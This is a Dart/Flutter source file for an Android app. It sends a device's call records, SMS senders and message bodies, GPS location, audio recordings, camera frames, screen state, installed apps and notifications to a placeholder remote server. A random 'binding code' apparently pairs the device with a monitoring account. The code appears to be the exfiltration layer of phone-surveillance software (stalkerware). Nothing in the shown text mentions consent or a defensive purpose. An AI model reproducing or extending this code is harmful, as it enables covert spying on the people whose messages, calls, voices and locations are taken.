import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'dart:typed_data';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
// import 'package:usage_stats/usage_stats.dart';

const String serverUrl = 'https://yourserver.com';

Future<String> getDeviceId() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
  return androidInfo.id;
}

// Future<void> sendAppUsageToServer() async {
//   bool? isGranted = await UsageStats.checkUsagePermission();
//   if (isGranted!) {
//     UsageStats.grantUsagePermission();
//     return;
//   }
//   DateTime end = DateTime.now();
//   DateTime start = DateTime(end.year, end.month, end.day, 0, 0, 0);
//   List<UsageInfo> stats = await UsageStats.queryUsageStats(start, end);
//   String deviceId = await getDeviceId();
//   var data = {
//     "device_id": deviceId,
//     "usage": stats.map((u) => {"package": u.packageName, "time": u.totalTimeInForeground}).toList()
//   };
//   await _postRequest('/app_usage', data);
// }

Future<void> sendCallDetailsToServer(callDetails) async {
  String deviceId = await getDeviceId();
  var data = {
    "device_id": deviceId,
    "number": callDetails.number,
    "type": callDetails.callType.toString(),
    "duration": callDetails.duration,
    "timestamp": callDetails.timestamp?.toString()
  };
  await _postRequest('/call_details', data);
}

Future<void> sendAudioDataToServer(Uint8List audioData) async {
  await _uploadFile('/upload_audio', 'audio.wav', audioData);
}

Future<void> sendCameraDataToServer(Uint8List imageData) async {
  await _uploadFile('/upload_camera_frame', 'image.jpg', imageData);
}

Future<void> sendSmsToServer(smsMessage) async {
  String deviceId = await getDeviceId();
  var data = {
    "device_id": deviceId,
    "sender": smsMessage.sender,
    "message": smsMessage.body,
    "timestamp": smsMessage.dateSent.toString()
  };
  await _postRequest('/sms_data', data);
}

Future<void> sendLocationToServer(double lat, double lon) async {
  String deviceId = await getDeviceId();
  var data = {
    "device_id": deviceId,
    "latitude": lat,
    "longitude": lon,
    "timestamp": DateTime.now().toIso8601String()
  };
  await _postRequest('/location', data);
}

Future<void> sendScreenStateToServer(String appState) async {
  String deviceId = await getDeviceId();
  var data = {
    "device_id": deviceId,
    "app_state": appState,
    "timestamp": DateTime.now().toIso8601String()
  };
  await _postRequest('/screen_monitoring', data);
}

Future<void> sendInstalledAppsToServer(List<String> apps) async {
  String deviceId = await getDeviceId();
  var data = {"device_id": deviceId, "installed_apps": apps};
  await _postRequest('/installed_apps', data);
}

Future<void> sendNotificationToServer(String notification) async {
  String deviceId = await getDeviceId();
  var data = {"device_id": deviceId, "notification": notification};
  await _postRequest('/notification', data);
}

Future<void> sendBindingCodeToServer() async {
  String bindingCode = _generateBindingCode();
  String deviceId = await getDeviceId();
  var data = {"device_id": deviceId, "binding_code": bindingCode};
  await _postRequest('/send_binding_code', data);
}

String _generateBindingCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return List.generate(6, (index) => chars[Random().nextInt(chars.length)]).join();
}

Future<void> _postRequest(String endpoint, Map<String, dynamic> data) async {
  try {
    var response = await http.post(
      Uri.parse('$serverUrl$endpoint'),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode(data),
    );
    if (response.statusCode == 200) {
      print("Data sent successfully to $endpoint");
    } else {
      print("Failed to send data to $endpoint: ${response.statusCode}");
    }
  } catch (e) {
    print("Error sending data to $endpoint: $e");
  }
}

Future<void> _uploadFile(String endpoint, String filename, Uint8List fileData) async {
  try {
    var request = http.MultipartRequest('POST', Uri.parse('$serverUrl$endpoint'))
      ..headers.addAll({"Content-Type": "multipart/form-data"})
      ..files.add(http.MultipartFile.fromBytes('file', fileData, filename: filename));
    var response = await request.send();
    if (response.statusCode == 200) {
      print("File uploaded successfully to $endpoint");
    } else {
      print("Failed to upload file to $endpoint: ${response.statusCode}");
    }
  } catch (e) {
    print("Error uploading file to $endpoint: $e");
  }
}
